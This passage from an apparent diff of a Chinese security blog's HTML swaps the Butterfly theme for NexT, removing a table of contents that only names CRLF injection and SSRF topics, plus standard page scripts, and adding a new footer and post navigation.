href="#NodeJS-%E4%B8%AD%E7%9A%84-CRLF-Injection"><span class="toc-text">NodeJS 中的 CRLF Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84-Unicode-%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F"><span class="toc-text">HTTP 请求路径中的 Unicode 字符损坏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode-%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F%E9%80%A0%E6%88%90%E7%9A%84-HTTP-%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB"><span class="toc-text">Unicode 字符损坏造成的 HTTP 拆分攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-HTTP-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5-1"><span class="toc-text">在 HTTP 状态行注入恶意首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-HTTP-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4-HTTP-%E8%AF%B7%E6%B1%82-1"><span class="toc-text">在 HTTP 状态行注入完整 HTTP 请求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF-SSRF-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8"><span class="toc-text">CRLF + SSRF 攻击内网应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-Redis"><span class="toc-text">攻击 Redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-MySQL"><span class="toc-text">攻击 MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBFTP"><span class="toc-text">攻击FTP</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/02/AyaN0%E6%A1%91%E7%9A%84%E9%9B%86%E8%AE%AD%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/" title="AyaN0桑的集训阶段总结">AyaN0桑的集训阶段总结</a><time datetime="2025-08-02T05:02:44.000Z" title="发表于 2025-08-02 13:02:44">2025-08-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="CRLF注入漏洞">CRLF注入漏洞</a><time datetime="2025-07-14T10:47:04.000Z" title="发表于 2025-07-14 18:47:04">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/" title="刷题蛆来咯-CTFshow">刷题蛆来咯-CTFshow</a><time datetime="2025-07-07T06:19:38.000Z" title="发表于 2025-07-07 14:19:38">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗">114514分钟能了解SSRF吗</a><time datetime="2025-07-07T05:05:59.000Z" title="发表于 2025-07-07 13:05:59">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类">磨好的利剑:PHP原生类</a><time datetime="2025-07-01T05:58:51.000Z" title="发表于 2025-07-01 13:58:51">2025-07-01</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2688080408" data-server="netease" data-type="song" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
-  const destroyAplayer = () => {
-    if (window.aplayers) {
-      for (let i = 0; i < window.aplayers.length; i++) {
-        if (!window.aplayers[i].options.fixed) {
-          window.aplayers[i].destroy()
-        }
-      }
-    }
-  }
 
-  const runMetingJS = () => {
-    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
-  }
+    </div>
 
-  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
-  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
-})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
-  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+    
+    
+    
 
-  window.pjax = new Pjax({
-    elements: 'a:not([target="_blank"])',
-    selectors: pjaxSelectors,
-    cacheBust: false,
-    analytics: false,
-    scrollRestoration: false
-  })
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
+        <span>微信</span>
+      </div>
 
-  const triggerPjaxFn = (val) => {
-    if (!val) return
-    Object.values(val).forEach(fn => fn())
-  }
+  </div>
+</div>
 
-  document.addEventListener('pjax:send', () => {
-    // removeEventListener
-    btf.removeGlobalFnEvent('pjaxSendOnce')
-    btf.removeGlobalFnEvent('themeChange')
+          <div class="post-tags">
+              <a href="/tags/Web-HTTP/" rel="tag"># -Web -HTTP</a>
+          </div>
 
-    // reset readmode
-    const $bodyClassList = document.body.classList
-    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+        
 
-    triggerPjaxFn(window.globalFn.pjaxSend)
-  })
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/" rel="prev" title="刷题蛆来咯-CTFshow">
+                  <i class="fa fa-angle-left"></i> 刷题蛆来咯-CTFshow
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/08/02/AyaN0%E6%A1%91%E7%9A%84%E9%9B%86%E8%AE%AD%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/" rel="next" title="AyaN0桑的集训阶段总结">
+                  AyaN0桑的集训阶段总结 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
 
-  document.addEventListener('pjax:complete', () => {
-    btf.removeGlobalFnEvent('pjaxCompleteOnce')
-    document.querySelectorAll('script[data-pjax]').forEach(item => {
-      const newScript = document.createElement('script')
-      const content = item.text || item.textContent || item.innerHTML || ""
-      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
-      newScript.appendChild(document.createTextNode(content))
-      item.parentNode.replaceChild(newScript, item)
-    })
 
-    triggerPjaxFn(window.globalFn.pjaxComplete)
-  })
 
-  document.addEventListener('pjax:error', e => {
-    if (e.request.status === 404) {
-      pjax.loadUrl('/404')
-    }
-  })
-})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">AyaN0</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">314k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">9:31</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
